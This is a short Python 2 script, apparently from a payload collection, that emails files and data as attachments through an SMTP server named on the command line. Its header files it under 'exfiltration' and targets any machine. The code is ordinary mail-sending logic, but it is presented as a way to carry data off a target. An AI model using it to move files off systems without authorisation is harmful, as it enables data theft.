# Title:	    Email-Sender
# Description:  Allows sending emails to a mail server, with file support
#               this is called using the Email-Sender library 
# Author: 	    TheDragonkeeper
# Version:	    1.1
# Category:     exfiltration
# Target: 	    Any
import sys
import smtplib, os
from email.MIMEMultipart import MIMEMultipart
from email.MIMEBase import MIMEBase
from email.MIMEText import MIMEText
from email.MIMEImage import MIMEImage
from email.Utils import COMMASPACE, formatdate
from email import Encoders
import ConfigParser

def send_mail(send_from, send_to, subject, text, files=None, 
                          data_attachments=None, server="None", port=587,
                          tls=True, html=False, images=None,
                          username=None, password=None, 
                          config_file=None, config=None):

    if files is None:
        files = []

    if images is None:
        images = []

    if data_attachments is None:
        data_attachments = []

    if config_file is not None:
        config = ConfigParser.ConfigParser()
        config.read(config_file)

    if config is not None:
        server = config.get('smtp', 'server')
        port = config.get('smtp', 'port')
        tls = config.get('smtp', 'tls').lower() in ('true', 'yes', 'y')
        username = config.get('smtp', 'username')
        password = config.get('smtp', 'password')

    msg = MIMEMultipart('related')
    msg['From'] = send_from
    msg['To'] = send_to if isinstance(send_to, basestring) else COMMASPACE.join(send_to)
    msg['Date'] = formatdate(localtime=True)
    msg['Subject'] = subject

    msg.attach( MIMEText(text, 'html' if html else 'plain') )

    for f in files:
        part = MIMEBase('application', "octet-stream")
        part.set_payload( open(f,"rb").read() )
        Encoders.encode_base64(part)
        part.add_header('Content-Disposition', 'attachment; filename="%s"' % os.path.basename(f))
        msg.attach(part)

    for f in data_attachments:
        part = MIMEBase('application', "octet-stream")
        part.set_payload( f['data'] )
        Encoders.encode_base64(part)
        part.add_header('Content-Disposition', 'attachment; filename="%s"' % f['filename'])
        msg.attach(part)

    for (n, i) in enumerate(images):
        fp = open(i, 'rb')
        msgImage = MIMEImage(fp.read())
        fp.close()
        msgImage.add_header('Content-ID', '<image{0}>'.format(str(n+1)))
        msg.attach(msgImage)

    smtp = smtplib.SMTP(server, int(port))
    if tls:
        smtp.starttls()

    if username is not None:
        smtp.login(username, password)
    smtp.sendmail(send_from, send_to, msg.as_string())
    smtp.close()
    

if len(sys.argv) > 8:
    send_mail(sys.argv[1], sys.argv[2],
                   sys.argv[3],
                   sys.argv[4],
                   server=sys.argv[5], username=sys.argv[6], password=sys.argv[7], files=[sys.argv[8]])
else:
    send_mail(sys.argv[1], sys.argv[2],
                   sys.argv[3],
                   sys.argv[4],
server=sys.argv[5], username=sys.argv[6], password=sys.argv[7])
